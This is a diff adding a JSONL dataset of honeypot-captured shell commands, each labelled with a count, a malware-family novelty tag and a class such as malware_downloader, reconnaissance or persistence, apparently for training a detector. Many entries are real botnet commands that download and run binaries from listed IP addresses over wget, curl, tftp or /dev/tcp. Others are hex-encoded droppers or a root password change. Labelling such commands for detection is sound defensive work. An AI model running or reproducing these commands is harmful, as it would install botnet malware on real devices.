@@ -1,0 +1,53 @@
+{"command": "sh /tmp/.ds", "count": 6, "sample": "novel_family", "label": "malware_execution"}
+{"command": "cat $pid/comm", "count": 16, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/dev/shm/bins.sh", "count": 1, "sample": "novel_family", "label": "malware_execution"}
+{"command": "/bin/busybox hostname TBOT", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "/bin/busybox Cult", "count": 10, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "curl -sk https://217.60.195.113/sh", "count": 6, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "Enter new UNIX password: ", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": ">/home/.f && /bin/busybox chmod 777 /home/.f && /home/.f && cd /home/; ", "count": 25, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "we", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x69\\x6E\\x20\\x2F\\x70\\x72\\x6F\\x63\" > .k", "count": 7, "sample": "novel_family", "label": "malware_downloader"}
+{"command": ">/dev/shm/.f && /bin/busybox chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/; ", "count": 25, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "sh .dl", "count": 1, "sample": "novel_family", "label": "malware_execution"}
+{"command": "/bin/busybox condixx", "count": 56, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "12345", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "busybox TEST", "count": 2, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "User-Agent: Mozilla/5.0 (Windows NT 10.0.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.63 Chrome/124.0.6367.63 Not-A.Brand/99  Safari/537.36", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "echo \"root:mH0MkhBjLDbi\"|chpasswd|bash", "count": 1, "sample": "novel_family", "label": "persistence"}
+{"command": "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86;do wget -q http://94.154.43.41/$a -O .b||curl -s http://94.154.43.41/$a -o .b||tftp -g -l .b -r $a 94.154.43.41||tftp -g -l $a 94.154.43.41;chmod +x .b && ./.b && break || chmod +x $a && ./$a && break;done;rm -f .b $a", "count": 174, "sample": "seen_family_new_variant", "label": "malware_downloader"}
+{"command": "score+3", "count": 50, "sample": "seen_family_new_variant", "label": "benign"}
+{"command": "wget -q -O bot http://91.92.40.5:8080/bots/bot-x86_64 2>/dev/null || curl -s -o bot http://91.92.40.5:8080/bots/bot-x86_64 2>/dev/null || tftp -g -r bots/bot-x86_64 -l bot 91.92.40.5 2>/dev/null || ftpget -v 91.92.40.5 bot bots/bot-x86_64 2>/dev/null; echo DLDONE", "count": 5, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "head -c 0 > /tmp/winminer", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "head -c 0 > /tmp/mips_linux_sign", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox EBYVD", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "cat", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w", "count": 64, "sample": "seen_family_new_variant", "label": "malware_downloader"}
+{"command": "ls", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "cd /tmp; ./update.XDarmv5l telnet 2>&1", "count": 2, "sample": "novel_family", "label": "malware_execution"}
+{"command": "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW", "count": 8, "sample": "novel_family", "label": "benign"}
+{"command": "echo -ne \"\\x20\\x3c\\x26\\x33\\x20\\x3e\\x20\\x24\\x42\\x49\\x4e\\x20\\x26\\x26\\x20\\x63\\x68\\x6d\\x6f\\x64\\x20\\x37\\x37\\x37\\x20\\x24\\x42\\x49\\x4e\\x20\\x26\\x26\\x20\\x24\\x42\\x49\\x4e\\x29\\x0a\\x0a\" >> update.sh", "count": 76, "sample": "seen_family_new_variant", "label": "malware_downloader"}
+{"command": "/bin/busybox echo -ne \"\\x2F\\x2A\\x3B\\x20\\x64\\x6F\\x0A\\x20\\x20\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x23\\x23\\x2A\\x2F\\x7D\\x0A\\x0A\" >> .k", "count": 42, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "./7891.x86_64", "count": 2, "sample": "novel_family", "label": "malware_execution"}
+{"command": ">/boot/.codi && cd /boot/", "count": 56, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "count": 4, "sample": "seen_family_new_variant", "label": "benign"}
+{"command": "rm -f /tmp/.testfile", "count": 15, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "cat /proc/mounts; /bin/busybox MXCOF", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "wget http://5.182.210.174/ok", "count": 34, "sample": "seen_family_new_variant", "label": "malware_downloader"}
+{"command": "echo -ne \"\\x4f\\x54\\x6c\\xf5\\x36\\xfc\\x1a\\xfc\\x31\\x3c\\xe2\\xb7\\x71\\xf7\\x3f\\x25\\x16\\x5d\\x6f\\xab\\x5c\\x81\\x92\\x41\\x1c\\x73\\xb4\\xb4\\xdd\\xcc\\x59\\xa6\" >> update.XDarmv5l", "count": 1348, "sample": "seen_family_new_variant", "label": "malware_downloader"}
+{"command": "echo -ne \"\\x02\\x10\\x81\\xe2\\x02\\x34\\x83\\xe1\\x01\\x00\\x56\\xe1\\x03\\xc0\\x8c\\xe0\\xf8\\xff\\xff\\x1a\\x59\\xff\\xff\\xea\\x42\\x19\\x00\\xeb\\x00\\x08\\xa0\\xe1\" >> update.armv5l", "count": 2579, "sample": "seen_family_new_variant", "label": "malware_downloader"}
+{"command": "nohup $SHELL -c \"curl http://8.222.174.150:60143/linux -o /tmp/Qt28DuiR0T; if [ ! -f /tmp/Qt28DuiR0T ]; then wget http://8.222.174.150:60143/linux -O /tmp/Qt28DuiR0T; fi; if [ ! -f /tmp/Qt28DuiR0T ]; then exec 6<>/dev/tcp/8.222.174.150/60143 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/Qt28DuiR0T && chmod +x /tmp/Qt28DuiR0T && /tmp/Qt28DuiR0T QpkemMfHhAiIODuXF4PFz4AWiDs8mReEzNuHEo0hPoEWmMfDjBCJPj+OBo7bx4QUlz44jQiHwMWMEIk+O4oGh83HmBeMPiGKH5jMwowQiT49jAaCwtuEFY8hPooWmMfHgRyPPz6IFpbExYAIiD07lxeCx9uHEIs1OYkXhM3VghGXODmXEYTbxIEQgzk/iBWA1c2YFIg/IYARmMfBgRyPPz6JEZbBwpgUjTwhiBWH28eEE4M5P4gVhNXBgQiLPDmXFILM244Xgzk/iBSF1c2YFIg3IYgUg9vMhxyPPz6LEJbBwpgUjTwhixKP28SPFoM5P4gUhdXEjhSXPjqICI/bxo8cjz8+iRaWxMGYF4g5IYsWgNvEgx+DOT+IF4DVxIIVlz4+iQiHwMyYF4k4NY8Wh8fElhKOITeACITGx5gXgTo1jxaHxcCWF4g8IYgUg9vEgQiIOz+DEIbExYcGgSE9ixSYxMKHCIg7NoMQhsTFhgaINz2XF4PE248IijY1jxaHxcWWEo4hPosXmMfEhgiMOjWPFofGxpYQiSE9iBKYxMSHCIE4NY8Wh8fClhKOIT2MF5jEw4cIiz03gxCGxMSOBow3IYoRmMTFggiNNjWPFofGxJYSjiE3gAiExseYF4E6NY8Wh8XAlhKOIT2MEpjEx4cIijs1jxaHwc2WFIg+IYAWmMfBgQiIPjyDEIbExIEGiD43lxWH28eCEpc+PYEcgMXEhBCZPj2MCIfHwZgfjyE+ixyAxcSEFJk7OJcUhcPbhxKNIT2IEozDxYcUji86gAiFw9uOFZc+Po4cgMXEhhEwkbH9LNlLlyg/Iig=; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/Qt28DuiR0T && /tmp/Qt28DuiR0T QpkemMfHhAiIODuXF4PFz4AWiDs8mReEzNuHEo0hPoEWmMfDjBCJPj+OBo7bx4QUlz44jQiHwMWMEIk+O4oGh83HmBeMPiGKH5jMwowQiT49jAaCwtuEFY8hPooWmMfHgRyPPz6IFpbExYAIiD07lxeCx9uHEIs1OYkXhM3VghGXODmXEYTbxIEQgzk/iBWA1c2YFIg/IYARmMfBgRyPPz6JEZbBwpgUjTwhiBWH28eEE4M5P4gVhNXBgQiLPDmXFILM244Xgzk/iBSF1c2YFIg3IYgUg9vMhxyPPz6LEJbBwpgUjTwhixKP28SPFoM5P4gUhdXEjhSXPjqICI/bxo8cjz8+iRaWxMGYF4g5IYsWgNvEgx+DOT+IF4DVxIIVlz4+iQiHwMyYF4k4NY8Wh8fElhKOITeACITGx5gXgTo1jxaHxcCWF4g8IYgUg9vEgQiIOz+DEIbExYcGgSE9ixSYxMKHCIg7NoMQhsTFhgaINz2XF4PE248IijY1jxaHxcWWEo4hPosXmMfEhgiMOjWPFofGxpYQiSE9iBKYxMSHCIE4NY8Wh8fClhKOIT2MF5jEw4cIiz03gxCGxMSOBow3IYoRmMTFggiNNjWPFofGxJYSjiE3gAiExseYF4E6NY8Wh8XAlhKOIT2MEpjEx4cIijs1jxaHwc2WFIg+IYAWmMfBgQiIPjyDEIbExIEGiD43lxWH28eCEpc+PYEcgMXEhBCZPj2MCIfHwZgfjyE+ixyAxcSEFJk7OJcUhcPbhxKNIT2IEozDxYcUji86gAiFw9uOFZc+Po4cgMXEhhEwkbH9LNlLlyg/Iig=\" &", "count": 1, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "/bin/busybox ECCHI", "count": 42, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "zyad5001", "count": 2, "sample": "novel_family", "label": "benign"}
+{"command": "curl http://176.65.139.202:80/telnet.sh -o /var/tmp/telnet.sh;chmod 777 /var/tmp/telnet.sh;sh /var/tmp/telnet.sh", "count": 3, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "tftp; wget; /bin/busybox EBYVD", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg", "count": 8, "sample": "novel_family", "label": "benign"}
+{"command": "/bin/busybox cat /proc/mounts; /bin/busybox bQCMF6Fj ", "count": 1, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "wget -qO- http://45.74.3.37:5001/bins.sh", "count": 1, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "ps | grep '[Mm]iner'", "count": 14, "sample": "novel_family", "label": "reconnaissance"}
+{"command": ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/", "count": 65, "sample": "novel_family", "label": "reconnaissance"}
+{"command": "clear", "count": 1, "sample": "novel_family", "label": "benign"}
+{"command": "wget -O /tmp/bins.sh http://45.74.3.37:5001/bins.sh && chmod +x /tmp/bins.sh && /tmp/bins.sh", "count": 1, "sample": "novel_family", "label": "malware_downloader"}
+{"command": "echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"", "count": 27665, "sample": "seen_family_new_variant", "label": "reconnaissance"}
+{"command": "(score+3)", "count": 50, "sample": "seen_family_new_variant", "label": "benign"}
